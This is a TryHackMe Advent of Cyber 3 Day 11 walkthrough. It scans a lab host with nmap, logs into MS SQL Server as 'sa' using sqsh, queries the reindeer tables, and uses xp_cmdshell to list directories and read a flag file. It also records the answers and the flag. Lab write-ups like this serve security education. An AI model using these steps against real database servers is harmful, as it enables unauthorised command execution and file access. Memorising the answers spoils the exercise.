# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 11
### References
* Tib3rius. (2021). TryHackMe - Advent of Cyber 3 - Day 11 Walkthrough [YouTube Video]. In YouTube. https://youtu.be/VJ2YFzTMqNY

## There is an open port related to MS SQL Server accessible over the network. What is the port number?
```bash
$ nmap -Pn 10.10.34.1
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

**Answer**: `1433`
## Let’s try to run `sqsh -S 10.10.34.1 -U sa -P t7uLKzddQzVjVFJp`. If the connection is successful, you will get a prompt. What is the prompt that you have received?
```bash
$ sqsh -S 10.10.34.1 -U sa -P t7uLKzddQzVjVFJp
1>
```

**Answer**: `1>`
## What is the first name of the reindeer of id 9?
```sql
1> SELECT * FROM reindeer.dbo.names;
2> go
 id  first     last       nickname   
 --- --------- ---------- -----------
   1 Dasher    Dasher     Dasher     
   2 Dancer    Dancer     Dancer     
   3 Prancer   Prancer    Prancer    
   4 Vixen     Vixen      Vixen      
   5 Comet     Comet      Comet      
   6 Cupid     Cupid      Cupid      
   7 Donner    Donder     Dunder     
   8 Blitzen   Blixem     Blitzen    
   9 Rudolph   Reindeer   Red Nosed  
```

**Answer**: `Rudolph`
## Check the table `schedule`. What is the destination of the trip scheduled on December 7?
```sql
1> SELECT * FROM reindeer.dbo.schedule;
2> go
 id       date                destination   notes  
 -------- ------------------- ------------- -------
     2000 Dec  5 2021 12:00AM Tokyo         NULL   
     2001 Dec  3 2021 12:00AM London        NULL   
     2002 Dec  1 2021 12:00AM New York      NULL   
     2003 Dec  2 2021 12:00AM Paris         NULL   
     2004 Dec  4 2021 12:00AM California    NULL   
     2005 Dec  7 2021 12:00AM Prague        NULL   
     2006 Dec 11 2021 12:00AM Bangkok       NULL   
     2007 Dec 10 2021 12:00AM Seoul         NULL   
```

**Answer**: `Prague`
## Check the table `presents`. What is the quantity available for the present `Power Bank`?
```sql
1> SELECT * FROM reindeer.dbo.presents;
2> go
 id     name               quantity   
 ------ ------------------ -----------
    100 Blanket                    500
    101 Laptop                    1000
    102 Cooler                     250
    103 BT Speaker                1000
    104 THM Subscription        100000
    105 Alarm Clock                500
    106 Cookies                  10000
    107 THM T-Shirt             100000
    108 Power Bank               25000
    109 USB Hub                  15000
```

**Answer**: `25000`
## There is a flag hidden in the `grinch` user's home directory. What are its contents?
* From previous TryHackMe Windows challenges, the `flag.txt` file is usually under the `Documents` or `Desktop` directories.
```cmd
1> xp_cmdshell 'dir C:\Users\grinch';
2> go
		11/10/2021  02:22 AM    <DIR>          3D Objects
		11/10/2021  02:22 AM    <DIR>          Contacts
		11/10/2021  02:22 AM    <DIR>          Desktop
		11/10/2021  02:29 AM    <DIR>          Documents
		11/10/2021  02:22 AM    <DIR>          Downloads
		11/10/2021  02:22 AM    <DIR>          Favorites
		11/10/2021  02:22 AM    <DIR>          Links
		11/10/2021  02:22 AM    <DIR>          Music
		11/10/2021  02:22 AM    <DIR>          Pictures
		11/10/2021  02:22 AM    <DIR>          Saved Games
		11/10/2021  02:22 AM    <DIR>          Searches
		11/10/2021  02:22 AM    <DIR>          Videos
1> xp_cmdshell 'dir C:\Users\grinch\Documents';
2> go
		11/10/2021  02:28 AM                21 flag.txt
1> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
2> go
		THM{YjtKeUy2qT3v5dDH}
```

**Flag**: `THM{YjtKeUy2qT3v5dDH}`